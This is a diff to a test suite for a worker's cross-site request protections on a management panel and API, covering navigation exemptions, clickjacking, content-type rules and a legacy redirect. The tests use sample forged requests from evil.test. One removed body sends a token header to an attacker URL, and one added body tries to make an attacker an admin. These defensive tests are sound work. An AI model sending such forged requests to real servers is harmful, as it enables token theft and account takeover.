@@ -46,7 +46,7 @@ describe("crossSiteRejection", () => {
 
     expect(check("POST", "/v1/chat/completions", sameOrigin)).toBeUndefined();
     expect(
-      check("POST", "/v8/management/requests/api-call", sameOrigin, "management"),
+      check("POST", "/v8/management/api-keys/probe", sameOrigin, "management"),
     ).toBeUndefined();
     expect(
       check("GET", "/v8/management/config", { "sec-fetch-site": "same-origin" }, "management"),
@@ -56,7 +56,7 @@ describe("crossSiteRejection", () => {
     expect(
       check(
         "GET",
-        "/management.html",
+        "/accounts",
         { "sec-fetch-site": "none", "sec-fetch-mode": "navigate" },
         "management",
       ),
@@ -65,8 +65,7 @@ describe("crossSiteRejection", () => {
 
   it("refuses state-changing cross-site requests on protected and management zones", () => {
     for (const zone of ["protected", "management"] as const) {
-      const path =
-        zone === "protected" ? "/v1/chat/completions" : "/v8/management/requests/api-call";
+      const path = zone === "protected" ? "/v1/chat/completions" : "/v8/management/api-keys/probe";
 
       const json = { "content-type": "application/json" };
       expect(check("POST", path, { ...json, origin: "https://evil.test" }, zone)).toBe(403);
@@ -113,24 +112,62 @@ describe("crossSiteRejection", () => {
     };
 
     expect(check("GET", "/v8/management/observability/usage/queue", image, "management")).toBe(403);
-    const link = { "sec-fetch-site": "cross-site", "sec-fetch-mode": "navigate" };
-    expect(check("GET", "/management.html", link, "management")).toBeUndefined();
+
+    const link = {
+      "sec-fetch-site": "cross-site",
+      "sec-fetch-mode": "navigate",
+      "sec-fetch-dest": "document",
+    };
+
+    expect(check("GET", "/accounts", link, "management")).toBeUndefined();
+    expect(check("GET", "/", link, "management")).toBeUndefined();
+    expect(check("GET", "/Settings/Config", link, "management")).toBeUndefined();
+    expect(check("HEAD", "/management.html", link, "management")).toBeUndefined();
+    expect(check("GET", "//Management.HTML", link, "management")).toBeUndefined();
+  });
+
+  it("exempts only top-level document navigations to panel pages", () => {
+    const link = {
+      "sec-fetch-site": "cross-site",
+      "sec-fetch-mode": "navigate",
+      "sec-fetch-dest": "document",
+    };
+
+    // A frame is a navigation too, but another site must not embed the panel (clickjacking).
+    for (const dest of ["iframe", "frame", "embed", "object", ""])
+      expect(check("GET", "/accounts", { ...link, "sec-fetch-dest": dest }, "management")).toBe(
+        403,
+      );
+
+    // The management API has no page to open from another site, OAuth callbacks included (providers redirect to the
+    // public callback paths); nor do the bundle files.
+    for (const path of [
+      "/v8/management/config",
+      "/v8/management/oauth/callback?provider=claude&state=s&code=c",
+      "/v8/management/credentials/download?name=a.json",
+      "/V8/Management/config.yaml",
+      "/assets/index.js",
+    ])
+      expect(check("GET", path, link, "management")).toBe(403);
+
+    // A navigation is GET or HEAD only.
+    expect(check("POST", "/accounts", link, "management")).toBe(403);
   });
 
   it("requires JSON (multipart for uploads, YAML for config.yaml) on management writes", () => {
     expect(
-      write("POST", "/v8/management/requests/api-call", {
+      write("POST", "/v8/management/api-keys/probe", {
         "content-type": "application/json; charset=utf-8",
       }),
     ).toBeUndefined();
     expect(
       write("PATCH", "/v8/management/config", { "content-type": "application/merge-patch+json" }),
     ).toBeUndefined();
+    expect(write("POST", "/v8/management/api-keys/probe", { "content-type": "text/plain" })).toBe(
+      415,
+    );
     expect(
-      write("POST", "/v8/management/requests/api-call", { "content-type": "text/plain" }),
-    ).toBe(415);
-    expect(
-      write("POST", "/v8/management/requests/api-call", {
+      write("POST", "/v8/management/api-keys/probe", {
         "content-type": "application/x-www-form-urlencoded",
       }),
     ).toBe(415);
@@ -149,7 +186,7 @@ describe("crossSiteRejection", () => {
     ).toBeUndefined();
     expect(write("PUT", "/v8/management/config", { "content-type": "application/yaml" })).toBe(415);
     // Bodies without a type are refused; bodiless writes (`DELETE ?name=`, `POST .../refresh`) are fine.
-    expect(write("POST", "/v8/management/requests/api-call", { "content-length": "12" })).toBe(415);
+    expect(write("POST", "/v8/management/api-keys/probe", { "content-length": "12" })).toBe(415);
     expect(
       write("POST", "/v8/management/credentials/refresh", { "transfer-encoding": "chunked" }),
     ).toBe(415);
@@ -175,13 +212,24 @@ describe("Worker entry point: cross-site protections", () => {
   });
 
   it("serves the panel and its same-origin JSON requests", async () => {
-    const panel = await worker("/management.html", {
-      headers: { "sec-fetch-site": "none", "sec-fetch-mode": "navigate" },
-    });
+    const navigate = {
+      "sec-fetch-site": "none",
+      "sec-fetch-mode": "navigate",
+      "sec-fetch-dest": "document",
+    };
+
+    const panel = await worker("/accounts", { headers: navigate });
 
     expect(panel.status).not.toBe(403);
     expect(panel.headers.get("access-control-allow-origin")).toBeNull();
     await panel.body?.cancel();
+
+    // A bookmark of the old panel lands on the new one.
+    const legacy = await worker("/management.html", { headers: navigate, redirect: "manual" });
+
+    expect(legacy.status).toBe(302);
+    expect(legacy.headers.get("location")).toBe("/");
+    expect(legacy.headers.get("access-control-allow-origin")).toBeNull();
 
     const panelHeaders = {
       origin: LOCAL,
@@ -194,15 +242,15 @@ describe("Worker entry point: cross-site protections", () => {
     expect(config.headers.get("access-control-allow-origin")).toBeNull();
     await config.body?.cancel();
 
-    // The panel's api-call probe reaches the handler (which validates the body).
-    const probe = await worker("/v8/management/requests/api-call", {
-      method: "POST",
+    // A same-origin JSON write reaches the handler.
+    const patch = await worker("/v8/management/config", {
+      method: "PATCH",
       headers: { ...panelHeaders, "content-type": "application/json" },
-      body: JSON.stringify({ url: "https://example.com" }),
+      body: JSON.stringify({ routing: { strategy: "fill-first" } }),
     });
 
-    expect(probe.status).toBe(400);
-    expect(await errorOf(probe)).toBe("missing method");
+    expect(patch.status).toBe(200);
+    await patch.body?.cancel();
 
     const yaml = await worker("/v8/management/config.yaml", {
       method: "PUT",
@@ -226,19 +274,14 @@ describe("Worker entry point: cross-site protections", () => {
   });
 
   it("refuses forged management writes from other sites before they reach a handler", async () => {
-    const forged = await worker("/v8/management/requests/api-call", {
-      method: "POST",
+    const forged = await worker("/v8/management/config", {
+      method: "PUT",
       headers: {
         origin: "https://evil.test",
         "sec-fetch-site": "cross-site",
         "content-type": "text/plain",
       },
-      body: JSON.stringify({
-        method: "GET",
-        url: "https://evil.test/steal",
-        header: { a: "$TOKEN$" },
-        auth_index: "x",
-      }),
+      body: JSON.stringify({ access: { "admin-emails": ["evil@evil.test"] } }),
     });
 
     expect(forged.status).toBe(403);
@@ -270,7 +313,7 @@ describe("Worker entry point: cross-site protections", () => {
     await simple.body?.cancel();
 
     // Cross-origin preflights get no CORS grant, so browsers never send the real request.
-    const preflight = await worker("/v8/management/requests/api-call", {
+    const preflight = await worker("/v8/management/config", {
       method: "OPTIONS",
       headers: { origin: "https://evil.test", "access-control-request-method": "POST" },
     });
